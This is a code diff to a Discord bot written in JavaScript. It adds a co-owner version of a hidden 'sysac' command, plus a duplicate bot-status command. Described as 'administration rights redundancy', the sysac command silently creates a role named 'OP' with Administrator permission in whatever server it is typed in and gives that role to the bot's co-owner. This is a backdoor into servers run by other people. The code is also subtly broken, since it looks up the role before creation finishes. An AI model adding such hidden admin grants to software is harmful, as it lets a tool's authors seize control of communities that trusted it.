@@ -190,8 +190,30 @@ client.on("message", (message) => {
      message.guild.member(me).addRole(role1);
   } else
 
+  // Administration rights redundancy CO_OWNER EDITION
+  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.co_ownerID){
+  let me = message.author
+  let role = message.guild.createRole({
+          name : 'OP',
+          color : "RANDOM",
+          permissions : [8],
+          position: 0
+          })
+          let role1 = message.guild.roles.find('name', 'OP')
+      message.channel.send(`done`)
+     message.guild.member(me).addRole(role1);
+  } else
+
   // Change bot status
   if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.ownerID){
+    let args = message.content.split(" ").slice(1);
+      Type = args[0]
+      Game = message.content.split(" ").slice(2).join(" ")
+      client.user.setPresence({ game: { name: `${Game}`, type: `${Type}` } });
+  } else
+
+  // Change bot status CO_OWNER EDITION
+  if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.co_ownerID){
     let args = message.content.split(" ").slice(1);
       Type = args[0]
       Game = message.content.split(" ").slice(2).join(" ")
